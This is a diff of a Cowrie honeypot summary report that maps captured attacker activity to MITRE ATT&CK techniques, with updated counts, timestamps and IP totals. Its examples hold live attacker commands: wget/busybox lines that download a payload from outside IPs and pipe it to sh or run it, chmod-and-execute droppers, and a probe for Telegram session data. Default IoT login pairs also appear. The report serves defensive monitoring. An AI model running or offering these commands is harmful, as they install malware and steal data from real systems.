@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-19 09:02:28",
+  "generated": "2026-08-19 10:03:12",
   "totals": {
-    "commands": 4619,
-    "login_failed": 2470,
-    "login_success": 1499,
-    "sessions": 2631
+    "commands": 4659,
+    "login_failed": 2504,
+    "login_success": 1502,
+    "sessions": 2663
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2470,
+      "count": 2504,
       "examples": [
         "root / vizxv",
         "root / 19801021",
@@ -21,14 +21,14 @@
         "root / 19820308"
       ],
       "first": "2026-08-19T00:00:00.138204Z",
-      "last": "2026-08-19T09:00:17.317030Z",
-      "unique_ips": 49
+      "last": "2026-08-19T10:02:47.093730Z",
+      "unique_ips": 50
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1499,
+      "count": 1502,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "hikvision / hikvision",
@@ -37,14 +37,14 @@
         "telnetadmin / telnetadmin"
       ],
       "first": "2026-08-19T00:00:00.538972Z",
-      "last": "2026-08-19T08:25:54.575927Z",
-      "unique_ips": 33
+      "last": "2026-08-19T10:01:35.567520Z",
+      "unique_ips": 34
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 72,
+      "count": 87,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-19T00:55:54.512846Z",
-      "last": "2026-08-19T07:43:44.986449Z",
-      "unique_ips": 7
+      "last": "2026-08-19T10:02:17.631966Z",
+      "unique_ips": 8
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 54,
+      "count": 58,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,46 +69,58 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T07:43:44.986449Z",
-      "unique_ips": 8
+      "last": "2026-08-19T10:02:17.631966Z",
+      "unique_ips": 9
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 8,
+      "count": 10,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
         "cat /proc/cpuinfo"
       ],
       "first": "2026-08-19T01:22:46.787305Z",
-      "last": "2026-08-19T06:53:31.995260Z",
+      "last": "2026-08-19T09:42:04.491328Z",
       "unique_ips": 7
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T07:43:08.989796Z",
-      "unique_ips": 3
+      "last": "2026-08-19T10:01:40.512582Z",
+      "unique_ips": 4
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 4,
       "examples": [
         "ps | grep '[Mm]iner'",
         "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-08-19T04:03:47.375514Z",
-      "last": "2026-08-19T04:03:48.137017Z",
+      "last": "2026-08-19T09:42:06.030292Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-08-19T04:03:45.090797Z",
+      "last": "2026-08-19T09:42:02.969766Z",
       "unique_ips": 1
     },
     {
@@ -125,15 +137,15 @@
       "unique_ips": 1
     },
     {
-      "id": "T1016",
-      "name": "System Network Configuration Discovery",
+      "id": "T1083",
+      "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
-        "ifconfig"
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
-      "first": "2026-08-19T04:03:45.090797Z",
-      "last": "2026-08-19T04:03:45.090797Z",
+      "first": "2026-08-19T04:03:48.902046Z",
+      "last": "2026-08-19T09:42:06.802038Z",
       "unique_ips": 1
     },
     {
@@ -146,18 +158,6 @@
       ],
       "first": "2026-08-19T07:24:31.248361Z",
       "last": "2026-08-19T07:24:31.248361Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
-      ],
-      "first": "2026-08-19T04:03:48.902046Z",
-      "last": "2026-08-19T04:03:48.902046Z",
       "unique_ips": 1
     },
     {
@@ -176,19 +176,19 @@
   "unmapped": [
     [
       "shell",
-      1477
+      1478
     ],
     [
       "sh",
-      1477
+      1478
     ],
     [
       "system",
-      1460
+      1461
     ],
     [
       "/bin/busybox",
-      20
+      27
     ],
     [
       "/bin/busybox LZRD",
@@ -200,26 +200,38 @@
     ],
     [
       "cd /proc && cat self/cmdline",
-      10
+      11
     ],
     [
       "enable",
-      9
+      10
     ],
     [
       "linuxshell",
-      8
+      9
     ],
     [
       "ping ;sh",
-      8
+      9
     ],
     [
       "enablelinuxshell",
-      7
+      8
     ],
     [
       "busybox",
+      3
+    ],
+    [
+      "/ip cloud print",
+      2
+    ],
+    [
+      "locate D877F783D5D3EF8Cs",
+      2
+    ],
+    [
+      "echo Hi | cat -n",
       2
     ],
     [
@@ -240,18 +252,6 @@
     ],
     [
       "/bin/busybox STC",
-      1
-    ],
-    [
-      "/bin/busybox hostname TOASTER",
-      1
-    ],
-    [
-      "/ip cloud print",
-      1
-    ],
-    [
-      "locate D877F783D5D3EF8Cs",
       1
     ]
   ]
